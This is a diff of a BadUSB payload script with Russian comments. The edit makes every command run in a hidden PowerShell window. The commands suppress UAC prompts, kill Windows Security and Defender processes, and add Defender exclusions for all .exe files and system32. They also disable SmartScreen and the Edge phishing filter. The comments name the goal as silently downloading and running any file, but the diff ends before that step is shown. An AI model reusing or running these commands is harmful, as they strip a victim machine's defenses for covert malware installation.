@@ -1,31 +1,31 @@
 #понижаем права администратора
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
-timeout /t 1
-powershell -Command "Start-Process -FilePath 'C:\Windows\System32\UserAccountControlSettings.exe' -ArgumentList '/autoaccept'"
+PowerShell.exe -WindowStyle Hidden -Command "reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
+PowerShell.exe -WindowStyle Hidden -Command "timeout /t 1"
+PowerShell.exe -WindowStyle Hidden  -Command "Start-Process -FilePath 'C:\Windows\System32\UserAccountControlSettings.exe' -ArgumentList '/autoaccept'"
 #добавляем исключения ,вырубаем смартскринт и убираем работу защитника
-taskkill /f /im SecurityHealthSystray.exe
-taskkill /f /im SecurityHealthService.exe
-taskkill /f /im SecurityHealthHost.exe
-taskkill /f /im SecurityHealthHost.exe
-taskkill /f /im RuntimeBroker.exe
-taskkill /f /im SecHealthUI.exe
-taskkill /f /im MicrosoftSecurityApp.exe
-timeout /t 1
-taskkill /f /im SecurityHealthSystray.exe
-taskkill /f /im SecurityHealthService.exe
-taskkill /f /im SecurityHealthHost.exe
-taskkill /f /im SecurityHealthHost.exe
-taskkill /f /im RuntimeBroker.exe
-taskkill /f /im SecHealthUI.exe
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v .exe /t REG_SZ /d "1" /reg:64
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extension" /v .exe /t REG_SZ /d "1" /reg:64
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v system32 /t REG_SZ /d "1" /reg:64
-Add-MpPreference -ExclusionExtension ".exe"
-timeout /t 1
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im SecurityHealthSystray.exe"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im SecurityHealthService.exe"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im SecurityHealthHost.exe"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im SecurityHealthHost.exe"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im RuntimeBroker.exe"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im SecHealthUI.exe"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im MicrosoftSecurityApp.exe"
+PowerShell.exe -WindowStyle Hidden -Command "timeout /t 1"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im SecurityHealthSystray.exe"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im SecurityHealthService.exe"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im SecurityHealthHost.exe"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im SecurityHealthHost.exe"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im RuntimeBroker.exe"
+PowerShell.exe -WindowStyle Hidden -Command "taskkill /f /im SecHealthUI.exe"
+PowerShell.exe -WindowStyle Hidden -Command "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v .exe /t REG_SZ /d "1" /reg:64"
+PowerShell.exe -WindowStyle Hidden -Command "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extension" /v .exe /t REG_SZ /d "1" /reg:64"
+PowerShell.exe -WindowStyle Hidden -Command "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v system32 /t REG_SZ /d "1" /reg:64"
+PowerShell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension ".exe""
+PowerShell.exe -WindowStyle Hidden -Command "timeout /t 1"
 PowerShell.exe -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Type DWord -Value 0"
 PowerShell.exe -WindowStyle Hidden -Command "If (!(Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter')) {New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Force | Out-Null}"
 PowerShell.exe -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Name 'EnabledV9' -Type DWord -Value 0"
-timeout /t 1
+PowerShell.exe -WindowStyle Hidden -Command "timeout /t 1"
 # Payload 1 для BadUSB
 # Задача: Скачать и запустить любой файл (хоть EXE, хоть MP3)
 # Этот файл нагрузки будет выполняться в фоновом режиме без видимых окон, и его размер может быть любым (в нём нет лимита на 259 символов)
